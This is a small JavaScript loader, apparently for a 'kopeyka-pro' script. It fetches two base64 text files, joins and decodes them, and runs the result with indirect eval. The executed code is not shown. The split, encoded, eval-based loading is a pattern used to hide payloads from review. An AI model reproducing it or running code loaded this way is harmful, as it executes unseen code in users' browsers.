/* kopeyka-pro.js loader v4 */
(function(){
function go(a,b){
  var bin=atob(a+b);
  var u=new Uint8Array(bin.length);
  for(var i=0;i<bin.length;i++) u[i]=bin.charCodeAt(i);
  var s=new TextDecoder("utf-8").decode(u);
  (0,eval)(s);
}
Promise.all([
  fetch("kopeyka-pro.b64a.txt?v=4").then(function(r){return r.text()}),
  fetch("kopeyka-pro.b64b.txt?v=4").then(function(r){return r.text()})
]).then(function(p){ go(p[0].trim(), p[1].trim()); })
  .catch(function(e){ console.error("pro load", e); });
})();
